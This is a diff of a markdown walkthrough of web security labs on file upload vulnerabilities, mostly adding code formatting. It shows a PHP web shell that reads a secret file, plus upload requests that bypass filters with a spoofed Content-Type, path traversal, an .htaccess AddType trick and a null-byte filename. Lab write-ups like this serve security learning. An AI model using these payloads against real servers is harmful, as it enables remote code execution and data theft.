@@ -9,8 +9,9 @@ Relatively simple lab involving remotely executing PHP code to retrieve a secret
 First, I looked for the vector of attack. I noticed a "My Account" button on the top-right, which led me to a page where I could upload my own avatar onto the server. This can be seen in the completion screenshot above.
 
 The lab mentioned that arbitrary uploads are allowed, so I just created a PHP file with the following code:
-
+> ```php
 > <?php system('cat /home/carlos/secret'); ?>
+> ```
 
 I uploaded it, then backed out from the success notification page.
 
@@ -30,21 +31,17 @@ Now the application blocks types that are not images, but depends on the `Conten
 ### Solution
 Since the lab has already told us that the application is only looking at the `Content-Type` header, I simply intercepted the POST request for the image upload using Repeater, and modified its header as follows:
 
-> ```
+> ```php
 > ------WebKitFormBoundaryl6Ap7k9EH4VFGLti
-> 
 > Content-Disposition: form-data; name="avatar"; filename="php-ws1.php"
-> 
 > Content-Type: image/png
-> 
-> 
 > 
 > <?php system('cat /home/carlos/secret'); ?>
 > ```
 
 It then gave the following response:
 
-> ```
+> ```html
 > The file avatars/php-ws1.php has been uploaded.<p>
 >     <a href="/my-account" title="Return to previous page">
 >         « Back to My Account
@@ -54,7 +51,7 @@ It then gave the following response:
 
 Then, I backed out into the My Account page, which will automatically try to load my avatar "image." I simply checked BurpSuite's Proxy and viewed the response, which contained the secret:
 
-> pNP7pCVuL94aw60KReIGjlEa1y1cdEyG
+> `pNP7pCVuL94aw60KReIGjlEa1y1cdEyG`
 
 Upon submission, the lab accepted it as the correct answer.
 
@@ -70,21 +67,19 @@ This one was not as simple, but still quite obvious having done the [path traver
 
 Since the app prevents execution in the `/avatar` directory, it may not prevent execution in `/files`. I did something similar to one of the path traversal labs, where I changed the filename in the initial POST request to include a traversal sequence as follows:
 
+> ```php
 > ------WebKitFormBoundarywCBCwHwmAhQW8KBG
->
 > Content-Disposition: form-data; name="avatar"; filename="..%2Fphp-ws1.php"
->
-> ontent-Type: application/x-php
->
-> 
+> Content-Type: application/x-php
 > 
 > <?php system('cat /home/carlos/secret'); ?>
+> ```
 
 Note the `..%2F` prepended to the `filename` field.
 
 Upon submitting this request, it responded with a success acknowledgement page. I backed out into the My Account page and inspected the response payload for the image request. It contained a string that looked like a secret:
 
-> yw2PC3vv7Fimcfaet2s0gpQqrgqpfa41
+> `yw2PC3vv7Fimcfaet2s0gpQqrgqpfa41`
 
 After submitting this, it turned out to be the correct secret from `/home/carlos/secret`.
 
@@ -98,29 +93,33 @@ Same goal as the previous labs, but now the application blacklists `.php` files.
 
 ### Solution
 This one was much harder than the previous one. After a few minutes of contemplating, I finally spotted a small detail:
+> ```
 > HTTP/2 403 Forbidden
 > Date: Sat, 31 Oct 2026 18:53:28 GMT
 > Server: Apache/2.4.41 (Ubuntu)
+> ```
 
 It seems that I was talking to an Apache server. I did a little research, and it turns out Apache servers have a configuration file called `.htaccess`, which contains directives on how the server should deal with certain things, **including** how to treat certain file extensions.
 
 There was one particularly useful directive called `AddType`, which will allow me to associate a file extension of **my choosing** to a pre-existing file type, such as PHP files!
 
 I created a new file and sent it through the file upload as `.htaccess`:
-> AddType application/x-httpd-php .pwned
+> `AddType application/x-httpd-php .pwned`
 
 The POST request succeeded as this file has absolutely no extensions at all, thus an extension blacklist would do nothing against it.
 
 I then proceeded to rename my exploit (which I re-used from [1](#1-remote-code-execution-via-web-shell-upload)) to `php-ws1.pwned` and proceeded in the request as follows:
 
+> ```php
 > ------WebKitFormBoundarynzrGapOnu7nRGr1x
 > Content-Disposition: form-data; name="avatar"; filename="php-ws1.pwned"
 > Content-Type: application/octet-stream
 > 
 > <?php system('cat /home/carlos/secret'); ?>
+> ```
 
 This time, the upload succeeded. I backed out into the My Account page and looked at the GET request for the "image", which yielded the secret:
-> rZxBcYKqLDqE1rQY6aw6F8oGCNWZHWm5
+> `rZxBcYKqLDqE1rQY6aw6F8oGCNWZHWm5`
 
 Submitting it verified the answer and completed the lab.
 
@@ -153,13 +152,15 @@ First, I attempted to upload `php-ws1.php` as-is. Unsurprisingly, I received the
 
 This meant that the server is whitelisting those two file types. However, I know that when Apache looks at filenames, it will treat the null byte as the normal terminator, signalling it to stop reading. Therefore, all I needed to do was modify the filename as follows:
 
+> ```
 > filename="pwned.php%00.png"
 > ...
 > Content-Type: image/png
+> ```
 
 Technically, it has a .png extension, but it will most likely be saved as a `.php` file if no further defenses are implemented. I backed out onto the My Account page and checked the response for the GET response for the avatar image. The following was included in the response:
 
-> iz5o8HHT6zX2CfoghrWV8MvNsds4ip5B
+> `iz5o8HHT6zX2CfoghrWV8MvNsds4ip5B`
 
 Submitting this into the solution tells me that it was the correct answer, which means the lab is complete.
 
